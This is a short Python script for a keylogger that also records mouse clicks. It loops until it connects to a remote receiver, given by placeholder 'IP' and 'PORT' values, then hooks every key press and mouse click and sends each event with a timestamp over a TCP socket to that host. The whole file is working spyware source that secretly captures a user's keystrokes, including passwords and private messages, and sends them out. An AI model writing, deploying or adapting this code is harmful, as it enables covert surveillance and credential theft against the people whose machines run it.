import keyboard, mouse
import datetime
import socket

HOST = "IP"
PORT = "PORT"

#Tries to connect to the receiver until it connects
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        break
    except:
        continue

def on_key_pressed(event):
    phrase = f"[{datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")}] Key pressed: {event.name} \n"
    sock.sendall(phrase.encode())

def on_click(event):
    try:
        x, y = mouse.get_position()
        phrase = f"[{datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")}] Click {event.event_type} {event.button} at ({x}, {y}) \n"
        sock.sendall(phrase.encode())
    except Exception:
        pass

#Calls the on_click function when any mouse button is clicked
mouse.hook(on_click)
keyboard.on_press(on_key_pressed)

#Calls the on_key_pressed function when any key is pressed
keyboard.wait()
mouse.wait()